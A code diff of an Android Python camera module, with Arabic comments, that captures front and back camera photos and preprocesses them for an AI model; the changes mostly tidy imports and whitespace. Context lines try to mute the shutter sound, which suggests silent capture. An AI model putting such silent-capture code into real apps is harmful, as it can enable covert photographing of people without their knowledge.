@@ -30,8 +30,8 @@ for d in [P, T, QUEUE]:
 
 # إعداد التسجيل
 logging.basicConfig(
-    filename=os.path.join(P, "c.log"), 
-    level=logging.ERROR, 
+    filename=os.path.join(P, "c.log"),
+    level=logging.ERROR,
     filemode='a',
     format='%(asctime)s - %(levelname)s - %(message)s'
 )
@@ -42,6 +42,28 @@ try:
     JNI = True
 except ImportError:
     JNI = False
+
+# ========== استيراد PIL و numpy مع معالجة الأخطاء ==========
+PIL_AVAILABLE = False
+NUMPY_AVAILABLE = False
+Image = None
+ImageOps = None
+np = None
+
+try:
+    from PIL import Image, ImageOps
+    PIL_AVAILABLE = True
+    logging.info("PIL loaded successfully")
+except ImportError as e:
+    logging.error(f"PIL import error: {e}")
+
+try:
+    import numpy as np
+    NUMPY_AVAILABLE = True
+    logging.info("NumPy loaded successfully")
+except ImportError as e:
+    logging.error(f"NumPy import error: {e}")
+
 
 # ========== كلاس الكاميرا ==========
 class CameraAnalyzer:
@@ -68,7 +90,7 @@ class CameraAnalyzer:
             "front_camera_id": 1,
             "back_camera_id": 0
         }
-        
+
         if os.path.exists(CONFIG):
             try:
                 with open(CONFIG, 'r') as f:
@@ -76,9 +98,9 @@ class CameraAnalyzer:
                     default_config.update(loaded_config)
             except Exception as e:
                 logging.error(f"Config load error: {e}")
-        
+
         return default_config
-    
+
     def _save_config(self):
         """حفظ الإعدادات إلى ملف"""
         try:
@@ -110,10 +132,10 @@ class CameraAnalyzer:
             Camera = autoclass('android.hardware.Camera')
             CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
             num_cameras = Camera.getNumberOfCameras()
-            
+
             if num_cameras <= cam_id:
                 return False
-                
+
             desired_facing = CameraInfo.CAMERA_FACING_BACK if cam_id == 0 else CameraInfo.CAMERA_FACING_FRONT
             for i in range(num_cameras):
                 info = CameraInfo()
@@ -173,17 +195,16 @@ class CameraAnalyzer:
     def _compress_image(self, path, quality=None):
         """يحاول ضغط ملف الصورة إلى جودة أقل"""
         quality = quality or self._config.get("quality", 80)
-        
-        try:
-            from PIL import Image
-            with Image.open(path) as img:
-                img = img.convert('RGB')
-                img.save(path, "JPEG", quality=quality, optimize=True)
-                return True
-        except ImportError:
-            pass
-        except Exception as e:
-            logging.error(f"PIL compression error: {e}")
+
+        # التحقق من توفر PIL
+        if PIL_AVAILABLE and Image is not None:
+            try:
+                with Image.open(path) as img:
+                    img = img.convert('RGB')
+                    img.save(path, "JPEG", quality=quality, optimize=True)
+                    return True
+            except Exception as e:
+                logging.error(f"PIL compression error: {e}")
 
         # محاولة ثانية باستخدام OpenCV إذا كان متوفراً
         try:
@@ -199,6 +220,7 @@ class CameraAnalyzer:
             pass
         except Exception as e:
             logging.error(f"OpenCV compression error: {e}")
+
         return False
 
     # ========== إنشاء اسم فريد للملف ==========
@@ -213,9 +235,9 @@ class CameraAnalyzer:
         """اختيار الحجم المناسب للصورة بناءً على الإعدادات"""
         if not supported_sizes:
             return None
-            
+
         size_pref = self._config.get("image_size", "medium")
-        
+
         # تحديد الأهداف بناءً على الإعدادات
         if size_pref == "small":
             target_area = 640 * 480
@@ -223,7 +245,7 @@ class CameraAnalyzer:
             target_area = 1920 * 1080
         else:  # medium
             target_area = 1024 * 768
-            
+
         # اختيار الحجم الأقرب للهدف
         return min(supported_sizes, key=lambda s: abs(s.width * s.height - target_area))
 
@@ -254,7 +276,7 @@ class CameraAnalyzer:
             if info.facing == desired_facing:
                 target_id = i
                 break
-        
+
         if target_id == -1:
             logging.error(f"No suitable camera found for facing: {desired_facing}")
             return None
@@ -278,13 +300,13 @@ class CameraAnalyzer:
                     logging.info(f"Selected camera size: {best_size.width}x{best_size.height}")
 
             params.setPictureFormat(autoclass('android.graphics.ImageFormat').JPEG)
-            
+
             # محاولة إسكات صوت الكاميرا
             try:
                 params.set("shutter-sound", 0)
             except:
                 pass
-                
+
             # التدوير حسب نوع الكاميرا
             rotation = 270 if cam_id == 1 else 90
             params.setRotation(rotation)
@@ -294,13 +316,13 @@ class CameraAnalyzer:
 
             class PicCallback(PythonJavaClass):
                 __javainterfaces__ = ['android.hardware.Camera$PictureCallback']
-                
+
                 def __init__(self, event, data_store, output_path):
                     super().__init__()
                     self.event = event
                     self.data_store = data_store
                     self.output_path = output_path
-                
+
                 @java_method('([BLandroid/hardware/Camera;)V')
                 def onPictureTaken(self, data, cam):
                     try:
@@ -316,7 +338,7 @@ class CameraAnalyzer:
             callback_ref = PicCallback(image_saved, image_data, out_path)
             camera.startPreview()
             time.sleep(0.5)  # تأخير قصير للسماح للمعاينة بالاستقرار
-            
+
             camera.takePicture(None, None, callback_ref)
 
             # انتظار حتى يتم حفظ الصورة أو انتهاء المهلة
@@ -360,48 +382,48 @@ class CameraAnalyzer:
             ctx = autoclass('org.kivy.android.PythonActivity').mActivity
             cm = ctx.getSystemService(ctx.CAMERA_SERVICE)
             camera_ids = cm.getCameraIdList()
-            
+
             if cam_id >= len(camera_ids):
                 logging.error(f"Camera2: ID {cam_id} out of range")
                 return None
-            
+
             camera_id = camera_ids[cam_id]
-            
+
             # إنشاء ImageReader للحصول على الصورة
             ImageReader = autoclass('android.media.ImageReader')
             ImageFormat = autoclass('android.graphics.ImageFormat')
             reader = ImageReader.newInstance(1024, 768, ImageFormat.JPEG, 1)
-            
+
             # إعداد Surface للتصوير
             Surface = autoclass('android.view.Surface')
             surfaces = [Surface(reader.getSurface())]
-            
+
             # فتح الكاميرا والحصول على المعاينة
             capture_success = threading.Event()
             capture_path = [None]
-            
+
             class CaptureCallback(PythonJavaClass):
                 __javainterfaces__ = ['android.hardware.camera2.CameraCaptureSession$CaptureCallback']
-                
+
                 def __init__(self, event, output_path):
                     super().__init__()
                     self.event = event
                     self.output_path = output_path
-                
+
                 @java_method('(Landroid/hardware/camera2/CameraCaptureSession;Landroid/hardware/camera2/CaptureRequest;Landroid/hardware/camera2/TotalCaptureResult;)V')
                 def onCaptureCompleted(self, session, request, result):
                     self.event.set()
-            
+
             # فتح الكاميرا
             class StateCallback(PythonJavaClass):
                 __javainterfaces__ = ['android.hardware.camera2.CameraDevice$StateCallback']
-                
+
                 def __init__(self, event, output_path, surfaces):
                     super().__init__()
                     self.event = event
                     self.output_path = output_path
                     self.surfaces = surfaces
-                
+
                 @java_method('(Landroid/hardware/camera2/CameraDevice;)V')
                 def onOpened(self, camera_device):
                     try:
@@ -411,7 +433,7 @@ class CameraAnalyzer:
                     except Exception as e:
                         logging.error(f"Camera2 onOpened error: {e}")
                         self.event.set()
-                
+
                 @java_method('(Landroid/hardware/camera2/CameraDevice;I)V')
                 def onError(self, camera_device, error):
                     logging.error(f"Camera2 onError: {error}")
@@ -420,7 +442,7 @@ class CameraAnalyzer:
             capture_path[0] = os.path.join(T, self._generate_unique_filename(f"c2_{cam_id}"))
             state_callback = StateCallback(capture_success, capture_path[0], surfaces)
             cm.openCamera(camera_id, state_callback, None)
-            
+
             # انتظار الإكمال
             if capture_success.wait(15):
                 # التحقق من وجود الملف
@@ -437,7 +459,7 @@ class CameraAnalyzer:
                 if capture_path[0]:
                     self._safe_remove(capture_path[0])
                 return None
-                
+
         except Exception as e:
             logging.error(f"Camera2 capture error: {e}")
             return None
@@ -453,7 +475,7 @@ class CameraAnalyzer:
         if not self._check_camera_permission():
             logging.error("Camera permission not granted")
             return None
-            
+
         if not self._is_camera_available(cam_id):
             logging.error(f"Camera {cam_id} not available")
             return None
@@ -461,7 +483,7 @@ class CameraAnalyzer:
         if self.busy:
             logging.warning("Camera is busy")
             return None
-            
+
         if not self._power_ok():
             logging.warning("Battery too low")
             return None
@@ -507,29 +529,31 @@ class CameraAnalyzer:
             self.busy = False
             # تنظيف الملفات القديمة
             self._cleanup_old_files()
-            gc.collect()
 
         return out_path
 
-    # ========== تحضير الصورة لـ AI (استيراد داخلي) ==========
+    # ========== تحضير الصورة لـ AI ==========
     def _prepare_for_ai(self, path):
         """
         تحويل الصورة إلى مصفوفة (224x224, float32) لتغذية النموذج.
-        تستورد numpy و PIL داخلياً لتجنب فشل التحميل إذا كانت المكتبات مفقودة.
         """
         if not os.path.exists(path):
             return None
-            
-        try:
-            from PIL import Image
-            import numpy as np
-        except ImportError:
-            logging.error("PIL or numpy not available")
+
+        # التحقق من توفر PIL و numpy
+        if not PIL_AVAILABLE or not NUMPY_AVAILABLE or Image is None or np is None:
+            logging.error("PIL or numpy not available for AI preprocessing")
             return None
 
         try:
             with Image.open(path) as img:
-                img = img.convert('RGB').resize((224, 224), Image.BILINEAR)
+                # استخدام Image.BILINEAR إذا متوفر، وإلا استخدم Image.LANCZOS كبديل
+                try:
+                    resample = Image.BILINEAR
+                except AttributeError:
+                    resample = Image.LANCZOS if hasattr(Image, 'LANCZOS') else None
+
+                img = img.convert('RGB').resize((224, 224), resample)
                 arr = np.asarray(img, dtype=np.float32) / 255.0
                 return np.expand_dims(arr, axis=0)
         except Exception as e:
@@ -638,6 +662,7 @@ class CameraAnalyzer:
             "power_ok": self._power_ok(),
             "config": self._config
         }
+
 
 # ========== دالة المصنع ==========
 def create(mon=None, det=None):
